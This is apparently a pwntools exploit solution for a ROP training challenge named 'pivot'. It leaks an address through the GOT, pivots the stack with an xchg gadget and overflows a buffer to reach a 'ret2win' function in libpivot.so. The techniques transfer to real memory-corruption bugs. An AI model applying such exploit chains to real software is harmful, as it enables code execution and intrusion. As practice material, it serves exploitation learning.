from pwn import * 
import binascii

elf = context.binary = ELF('pivot')
libpivot = ELF('libpivot.so')

context.log_level = 'critical'

p = elf.process()

pop_rdi = 0x0000000000400a33

offset = 40

payload1 = flat([
    elf.symbols['foothold_function'],
    pop_rdi,
    elf.symbols.got['foothold_function'],
    elf.plt.puts,
    elf.symbols.main
])

p.recvuntil(b'pivot: ')
data = p.recv()
data = data.split(b'\n')
pivot_address = int(data[0].decode(), 16)
print(f'Pivot address @ {hex(pivot_address)}')

p.sendline(payload1)

pop_rax = 0x00000000004009bb
xchg_rsp_rax = 0x00000000004009bd

payload2 = flat([
    offset * 'a',
    pop_rax,
    pivot_address,
    xchg_rsp_rax
])

p.sendline(payload2)
p.recvuntil(b'libpivot')
data2 = p.recv()
data2 = data2.split(b'\n')
print(f'\nLeaked string here {data2[1]}\n')
byte_string = data2[1]
foothold_got = int(binascii.hexlify(byte_string[::-1]).decode('utf-8'), 16)

print(f'foothold@got {hex(foothold_got)}')

libpivot_base = foothold_got - libpivot.symbols.foothold_function
ret2win = libpivot_base + libpivot.symbols.ret2win

payload3 = flat([
    offset * 'a',
    ret2win
    
])

p.sendline(payload3)
p.interactive()
